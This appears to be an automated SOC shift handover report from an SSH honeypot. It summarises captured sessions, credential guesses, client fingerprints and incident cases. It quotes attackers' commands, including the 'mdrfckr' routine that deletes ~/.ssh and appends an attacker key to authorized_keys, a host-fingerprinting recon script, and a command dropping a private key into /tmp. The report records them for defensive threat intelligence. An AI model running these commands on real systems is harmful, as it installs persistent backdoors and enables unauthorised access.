# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-23 |
| **Generated At** | 2026-10-23T02:26:37Z |
| **Shift Time** | 02:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **46** |
| Confirmed Threats | **36** |
| False Positives Filtered | **10** (21.7%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **15** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **19** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **882** |
| Unique Credential Pairs | **823** |
| Unique Usernames | **389** |
| Unique Passwords | **629** |
| Successful Auth Pairs | **870** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 259 |
| `admin` | 27 |
| `ubuntu` | 26 |
| `user` | 15 |
| `deploy` | 14 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 47 |
| `123` | 22 |
| `password` | 14 |
| `1234` | 14 |
| `12345678` | 11 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 6 |
| `root` | `password` | 4 |
| `admin` | `admin` | 4 |
| `root` | `123456` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `bitrix` | `bitrix24` | `195.178.110.218` | 2026-10-23T00:00:02 |
| `oot` | `4545` | `109.160.32.152` | 2026-10-23T00:00:04 |
| `frappe` | `frappe@123` | `109.160.32.152` | 2026-10-23T00:00:08 |
| `airflow` | `airflow` | `109.160.32.152` | 2026-10-23T00:00:12 |
| `bitrix` | `bitrix123` | `195.178.110.218` | 2026-10-23T00:00:14 |
| `root` | `2244` | `109.160.32.152` | 2026-10-23T00:00:17 |
| `packer` | `packer` | `109.160.32.152` | 2026-10-23T00:00:21 |
| `bitrix` | `123456` | `195.178.110.218` | 2026-10-23T00:00:24 |
| `test` | `1` | `109.160.32.152` | 2026-10-23T00:00:26 |
| `paas` | `Huawei12` | `109.160.32.152` | 2026-10-23T00:00:31 |
| `bitrix` | `Bitrix@123` | `195.178.110.218` | 2026-10-23T00:00:35 |
| `data` | `data` | `109.160.32.152` | 2026-10-23T00:00:37 |
| `admin1234` | `admin1234` | `109.160.32.152` | 2026-10-23T00:00:41 |
| `operator` | `operator00` | `109.160.32.152` | 2026-10-23T00:00:46 |
| `bitrix` | `Admin@123` | `195.178.110.218` | 2026-10-23T00:00:47 |
| `root` | `123321` | `109.160.32.152` | 2026-10-23T00:00:51 |
| `postgres` | `1` | `109.160.32.152` | 2026-10-23T00:00:56 |
| `bitrix` | `bitrix2026` | `195.178.110.218` | 2026-10-23T00:00:57 |
| `github` | `Passw0rd` | `109.160.32.152` | 2026-10-23T00:01:01 |
| `newuser` | `123456` | `109.160.32.152` | 2026-10-23T00:01:06 |
_… 850 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **46** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 21 |
| Go SSH scanner | 7 |
| OpenSSH | 2 |
| Perl Net::SSH | 2 |
| AsyncSSH (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 19 | 10 |
| `16443846184e...` | Generic scanner | 3 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 2 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |
| `19532158b559...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 19 | 10 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 3 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 2 | 2 | — |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `d1c5d296d532...` | AsyncSSH (Python) | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 25 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 9 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.227`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.135.129.27`, `50.6.4.228`, `88.142.46.185`, `51.254.103.32`, `20.127.185.37`, `49.207.40.162`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **19** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 10 | HIGH |
| `AS213412` | ONYPHE SAS | 6 | LOW |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS51396` | Pfcloud UG | 1 | HIGH |
| `AS214677` | Matteo Martelloni trading as DELUXHOST | 1 | HIGH |
| `AS28283` | Adylnet Telecom | 1 | MEDIUM |
| `AS15557` | Societe Francaise Du Radiotelephone - SFR SA | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-82d253fbecd0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-23 00:00 |
| **Last Seen** | 2026-10-23 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:00:02` | `cowrie.session.connect` |
| `2026-10-23 00:00:02` | `cowrie.client.version` |
| `2026-10-23 00:00:02` | `cowrie.client.kex` |
| `2026-10-23 00:00:02` | `cowrie.login.success` |
| `2026-10-23 00:00:03` | `cowrie.session.params` |
| `2026-10-23 00:00:03` | `cowrie.command.input` |
| `2026-10-23 00:00:03` | `cowrie.log.closed` |
| `2026-10-23 00:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd32446a61a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]152` |
| **First Seen** | 2026-10-23 00:00 |
| **Last Seen** | 2026-10-23 00:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:00:03` | `cowrie.session.connect` |
| `2026-10-23 00:00:03` | `cowrie.client.version` |
| `2026-10-23 00:00:03` | `cowrie.client.kex` |
| `2026-10-23 00:00:04` | `cowrie.login.success` |
| `2026-10-23 00:00:05` | `cowrie.session.params` |
| `2026-10-23 00:00:05` | `cowrie.command.input` |
| `2026-10-23 00:00:05` | `cowrie.log.closed` |
| `2026-10-23 00:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]152` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dadaf91fcbf3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-10-23 00:03 |
| **Last Seen** | 2026-10-23 00:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:03:33` | `cowrie.session.connect` |
| `2026-10-23 00:03:33` | `cowrie.client.version` |
| `2026-10-23 00:03:33` | `cowrie.client.kex` |
| `2026-10-23 00:03:35` | `cowrie.login.success` |
| `2026-10-23 00:03:36` | `cowrie.session.params` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| `2026-10-23 00:03:36` | `cowrie.command.success` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| `2026-10-23 00:03:36` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b41ad91ec9b

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-23 00:14 |
| **Last Seen** | 2026-10-23 00:19 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:14:55` | `cowrie.session.connect` |
| `2026-10-23 00:14:55` | `cowrie.client.version` |
| `2026-10-23 00:14:56` | `cowrie.client.kex` |
| `2026-10-23 00:14:57` | `cowrie.login.success` |
| `2026-10-23 00:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a73321db853b

| Field | Detail |
|---|---|
| **Source IP** | `107.150.123[.]48` |
| **First Seen** | 2026-10-23 00:30 |
| **Last Seen** | 2026-10-23 00:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:30:28` | `cowrie.session.connect` |
| `2026-10-23 00:30:28` | `cowrie.client.version` |
| `2026-10-23 00:30:30` | `cowrie.client.kex` |
| `2026-10-23 00:30:31` | `cowrie.login.success` |
| `2026-10-23 00:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.123[.]48` to AbuseIPDB if not already reported
- [ ] Block `107.150.123[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40f7ca921c4

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-10-23 00:30 |
| **Last Seen** | 2026-10-23 00:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:30:31` | `cowrie.session.connect` |
| `2026-10-23 00:30:31` | `cowrie.client.version` |
| `2026-10-23 00:30:31` | `cowrie.client.kex` |
| `2026-10-23 00:30:31` | `cowrie.login.success` |
| `2026-10-23 00:30:34` | `cowrie.session.params` |
| `2026-10-23 00:30:34` | `cowrie.command.input` |
| `2026-10-23 00:30:34` | `cowrie.session.file_download` |
| `2026-10-23 00:30:34` | `cowrie.session.file_download` |
| `2026-10-23 00:30:34` | `cowrie.log.closed` |
| `2026-10-23 00:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c11c6120b9

| Field | Detail |
|---|---|
| **Source IP** | `43.135.129[.]27` |
| **First Seen** | 2026-10-23 00:31 |
| **Last Seen** | 2026-10-23 00:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:31:46` | `cowrie.session.connect` |
| `2026-10-23 00:31:46` | `cowrie.client.version` |
| `2026-10-23 00:31:47` | `cowrie.client.kex` |
| `2026-10-23 00:31:47` | `cowrie.login.success` |
| `2026-10-23 00:31:47` | `cowrie.session.params` |
| `2026-10-23 00:31:47` | `cowrie.command.input` |
| `2026-10-23 00:31:47` | `cowrie.command.failed` |
| `2026-10-23 00:31:48` | `cowrie.log.closed` |
| `2026-10-23 00:31:48` | `cowrie.session.params` |
| `2026-10-23 00:31:48` | `cowrie.command.input` |
| `2026-10-23 00:31:48` | `cowrie.session.file_download` |
| `2026-10-23 00:31:48` | `cowrie.log.closed` |
| `2026-10-23 00:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.129[.]27` to AbuseIPDB if not already reported
- [ ] Block `43.135.129[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0454cca2280

| Field | Detail |
|---|---|
| **Source IP** | `43.135.129[.]27` |
| **First Seen** | 2026-10-23 00:31 |
| **Last Seen** | 2026-10-23 00:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:31:49` | `cowrie.session.connect` |
| `2026-10-23 00:31:49` | `cowrie.client.version` |
| `2026-10-23 00:31:49` | `cowrie.client.kex` |
| `2026-10-23 00:31:49` | `cowrie.login.success` |
| `2026-10-23 00:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.129[.]27` to AbuseIPDB if not already reported
- [ ] Block `43.135.129[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc2db0341c8

| Field | Detail |
|---|---|
| **Source IP** | `167.126.6[.]183` |
| **First Seen** | 2026-10-23 00:35 |
| **Last Seen** | 2026-10-23 00:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:35:54` | `cowrie.session.connect` |
| `2026-10-23 00:35:55` | `cowrie.client.version` |
| `2026-10-23 00:35:55` | `cowrie.client.kex` |
| `2026-10-23 00:35:58` | `cowrie.login.success` |
| `2026-10-23 00:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.126.6[.]183` to AbuseIPDB if not already reported
- [ ] Block `167.126.6[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a2efaa3f27

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-10-23 00:40 |
| **Last Seen** | 2026-10-23 00:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:40:22` | `cowrie.session.connect` |
| `2026-10-23 00:40:22` | `cowrie.client.version` |
| `2026-10-23 00:40:22` | `cowrie.client.kex` |
| `2026-10-23 00:40:22` | `cowrie.login.success` |
| `2026-10-23 00:40:23` | `cowrie.session.params` |
| `2026-10-23 00:40:23` | `cowrie.command.input` |
| `2026-10-23 00:40:23` | `cowrie.command.failed` |
| `2026-10-23 00:40:24` | `cowrie.log.closed` |
| `2026-10-23 00:40:25` | `cowrie.session.params` |
| `2026-10-23 00:40:25` | `cowrie.command.input` |
| `2026-10-23 00:40:25` | `cowrie.session.file_download` |
| `2026-10-23 00:40:25` | `cowrie.log.closed` |
| `2026-10-23 00:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947b064dc0d4

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-10-23 00:40 |
| **Last Seen** | 2026-10-23 00:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:40:25` | `cowrie.session.connect` |
| `2026-10-23 00:40:25` | `cowrie.client.version` |
| `2026-10-23 00:40:25` | `cowrie.client.kex` |
| `2026-10-23 00:40:26` | `cowrie.login.success` |
| `2026-10-23 00:40:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79bcd98996fb

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-10-23 00:40 |
| **Last Seen** | 2026-10-23 00:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:40:50` | `cowrie.session.connect` |
| `2026-10-23 00:40:50` | `cowrie.client.version` |
| `2026-10-23 00:40:51` | `cowrie.client.kex` |
| `2026-10-23 00:40:53` | `cowrie.login.success` |
| `2026-10-23 00:40:54` | `cowrie.session.params` |
| `2026-10-23 00:40:54` | `cowrie.command.input` |
| `2026-10-23 00:40:54` | `cowrie.command.failed` |
| `2026-10-23 00:40:54` | `cowrie.log.closed` |
| `2026-10-23 00:40:55` | `cowrie.session.params` |
| `2026-10-23 00:40:55` | `cowrie.command.input` |
| `2026-10-23 00:40:56` | `cowrie.session.file_download` |
| `2026-10-23 00:40:56` | `cowrie.log.closed` |
| `2026-10-23 00:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2709579117db

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-10-23 00:40 |
| **Last Seen** | 2026-10-23 00:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:40:56` | `cowrie.session.connect` |
| `2026-10-23 00:40:56` | `cowrie.client.version` |
| `2026-10-23 00:40:56` | `cowrie.client.kex` |
| `2026-10-23 00:40:57` | `cowrie.login.success` |
| `2026-10-23 00:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecb2abdcdaf6

| Field | Detail |
|---|---|
| **Source IP** | `20.127.185[.]37` |
| **First Seen** | 2026-10-23 00:49 |
| **Last Seen** | 2026-10-23 00:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
